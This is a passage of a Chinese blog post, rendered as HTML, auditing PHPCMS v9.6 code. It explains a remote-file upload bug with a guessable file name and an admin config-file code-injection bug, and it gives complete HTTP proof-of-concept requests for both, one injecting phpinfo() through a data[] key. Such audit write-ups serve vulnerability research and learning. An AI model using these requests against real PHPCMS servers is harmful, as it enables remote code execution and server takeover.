class="hljs-title">fillurl</span>(<span class="hljs-params"><span class="hljs-variable">$surl</span>, <span class="hljs-variable">$absurl</span>, <span class="hljs-variable">$basehref</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>      	<span class="hljs-comment">// 去掉 # 后面的内容，帮助我们绕过后缀限制 </span><br>      	<span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$surl</span>,<span class="hljs-string">&#x27;#&#x27;</span>);<br>				<span class="hljs-keyword">if</span>(<span class="hljs-variable">$pos</span>&gt;<span class="hljs-number">0</span>) <span class="hljs-variable">$surl</span> = substr(<span class="hljs-variable">$surl</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$pos</span>);<br>      	……<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getname</span>(<span class="hljs-params"><span class="hljs-variable">$fileext</span></span>)</span>&#123;<br>   			<span class="hljs-keyword">return</span> date(<span class="hljs-string">&#x27;Ymdhis&#x27;</span>).rand(<span class="hljs-number">100</span>, <span class="hljs-number">999</span>).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$fileext</span>;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过分析我们还是能写入文件，只是文件名是随机生成的，需要我们去猜测，总结目录文件名的生成规律如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">文件名：<span class="hljs-number">1</span>.php<span class="hljs-comment">#1.jpg</span><br>写入文件名：uploadfile/date(<span class="hljs-string">&#x27;Y/md/&#x27;</span>)/date(<span class="hljs-string">&#x27;Ymdhis&#x27;</span>).rand(<span class="hljs-number">100</span>, <span class="hljs-number">999</span>).<span class="hljs-string">&#x27;.&#x27;</span>.php;<br>示例：<br>date(<span class="hljs-string">&#x27;Y/md/&#x27;</span>),date(<span class="hljs-string">&#x27;Ymdhis&#x27;</span>) 和时间有关，唯一难确定的就是秒数，不过猜测也就是几秒之间徘徊<br>rand(<span class="hljs-number">100</span>,<span class="hljs-number">999</span>) 随机数<span class="hljs-number">3</span>位，还算好猜测，所以最终只需要爆破<span class="hljs-number">4</span>位数就能获取到写入的文件名<br></code></pre></td></tr></table></figure>
+
+<p>漏洞利用poc，注意对特殊符号url编码：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>phpcms.test:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>294<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://phpcms.test:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://phpcms.test:8888/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=20cb7d807c07acf2cf5d3172b50bb10c; XDEBUG_SESSION=XDEBUG_ECLIPSE<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="apache"><span class="hljs-attribute">siteid</span>=<span class="hljs-number">1</span>&amp;modelid=<span class="hljs-number">1</span>&amp;username=<span class="hljs-number">111</span>&amp;password=<span class="hljs-number">123456</span>&amp;pwdconfirm=<span class="hljs-number">123456</span>&amp;email=<span class="hljs-number">111</span>%<span class="hljs-number">40</span>qq.com&amp;nickname=<span class="hljs-number">111</span>&amp;info%<span class="hljs-number">5</span>Bcontent%<span class="hljs-number">5</span>D=href%<span class="hljs-number">3</span>Dhttp%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ftest.test%<span class="hljs-number">3</span>A<span class="hljs-number">8888</span>%<span class="hljs-number">2</span>Ftest%<span class="hljs-number">2</span>F<span class="hljs-number">1</span>.php%<span class="hljs-number">231</span>.jpg&amp;dosubmit=<span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure>
+
+<p>最后总结一下，该漏洞的审计过程也是很复杂的，需要发现一条完整的利用链，虽然最后利用起来也不是很方便，但发现这种漏洞也是审计的意义</p>
+<h2 id="后台敏感内容写入"><a href="#后台敏感内容写入" class="headerlink" title="后台敏感内容写入"></a>后台敏感内容写入</h2><blockquote>
+<p>phpsso_server/phpcms/modules/admin/system.php</p>
+</blockquote>
+<p>uc() 会通过$POST传入data[]数组，并将data[]的键值写入到uc_config.php文件中，我们便可以把任意内容写入system.php中，从而获取服务器权限。但需要注意的是，尽量把exp写在data[]的键中，在全局分析中我们知道对外出传入数组的值有过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uc</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dosubmit&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>      	<span class="hljs-comment">// $uc_config 将写入一个完整php代码</span><br>      	<span class="hljs-variable">$uc_config</span> = <span class="hljs-string">&#x27;&lt;?php &#x27;</span>.<span class="hljs-string">&quot;\ndefine(&#x27;UC_CONNECT&#x27;, &#x27;mysql&#x27;);\n&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>          	<span class="hljs-comment">// 将一行一行的写入</span><br>          	<span class="hljs-variable">$uc_config</span> .= <span class="hljs-string">&quot;define(&#x27;&quot;</span>.strtoupper(<span class="hljs-variable">$k</span>).<span class="hljs-string">&quot;&#x27;, &#x27;<span class="hljs-subst">$v</span>&#x27;);\n&quot;</span>;<br>				&#125;<br>      	<span class="hljs-comment">// 位于phpsso_server/caches/configs/uc_config.php，外部配置项会写入其中</span><br>      	<span class="hljs-variable">$uc_config_filepath</span> = CACHE_PATH.<span class="hljs-string">&#x27;configs&#x27;</span>.DIRECTORY_SEPARATOR.<span class="hljs-string">&#x27;uc_config.php&#x27;</span>;<br>      	@file_put_contents(<span class="hljs-variable">$uc_config_filepath</span>, <span class="hljs-variable">$uc_config</span>);<br>		&#125;<br>		……<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>POC如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/phpsso_server/index.php?m=admin&amp;c=system&amp;a=uc</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>phpcms.test:8888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>285<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://phpcms.test:8888<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://phpcms.test:8888/phpsso_server/index.php?m=admin&amp;c=system&amp;a=uc<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>需要登陆<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="apache"><span class="hljs-attribute">ucuse</span>=<span class="hljs-number">0</span>&amp;data%<span class="hljs-number">5</span>BUC_TEST&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;);phpinfo();//%<span class="hljs-number">5</span>D=<span class="hljs-number">111</span>&amp;data%<span class="hljs-number">5</span>Buc_api%<span class="hljs-number">5</span>D=<span class="hljs-number">111</span>&amp;data%<span class="hljs-number">5</span>Buc_ip%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_dbhost%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_dbuser%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_dbpw%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_dbname%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_dbtablepre%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_dbcharset%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_appid%<span class="hljs-number">5</span>D=&amp;data%<span class="hljs-number">5</span>Buc_key%<span class="hljs-number">5</span>D=&amp;dosubmit=%E<span class="hljs-number">6</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">90</span>%E<span class="hljs-number">4</span>%BA%A<span class="hljs-number">4</span></span><br></code></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<img src="img/phpcms/image-20210831161322638.png" srcset="/img/loading.gif" lazyload alt="image-20210831161322638" style="zoom:50%;" />
+
+<img src="img/phpcms/image-20210831161337998.png" srcset="/img/loading.gif" lazyload alt="image-20210831161337998" style="zoom:50%;" />
+
+
+
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>本次对 phpcms 做了一个代码审计，通过全局分析掌握了phpcms的基本MVC模式，能明显感受到phpcms不同于其他的CMS，它的结构更加复杂，审计起来十分磨人。其实审计phpcms的代码我也没有完全的看完，基本都是看的前人挖出的漏洞复现审计。感觉想要完全审计下这种结构的代码需要十足的耐心才行。</p>
+<p>参考：</p>
+<p>PHPCMS v9.6.0 任意文件上传漏洞分析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/273/">https://paper.seebug.org/273/</a></p>
+<p>PHPCMS v9.6.0 wap模块 SQL注入：<a target="_blank" rel="noopener" href="https://paper.seebug.org/275/">https://paper.seebug.org/275/</a> ; <a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/57486.html">https://www.secpulse.com/archives/57486.html</a></p>
+<p>PHPCMS 代码审计：<a target="_blank" rel="noopener" href="https://github.com/jiangsir404/PHP-code-audit/blob/master/phpcms/phpcmsv9.6.0-sqli.md">https://github.com/jiangsir404/PHP-code-audit/blob/master/phpcms/phpcmsv9.6.0-sqli.md</a></p>
+<p>PHPCMS历史漏洞分析：<a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p>
+<p>PHPCMS漏洞分析合集(上)：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5730">https://xz.aliyun.com/t/5730</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/dedecms/">
+                        <span class="hidden-mobile">通过 DedeCMS 学习 php 代码审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"KoUUnhC8sqDPadKwA0C4f83s-gzGzoHsz","appKey":"FLKClsTKX9X9TPMSO1z9FK1T","placeholder":"说点什么","path":"window.location.pathname","avatar":"robohash","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
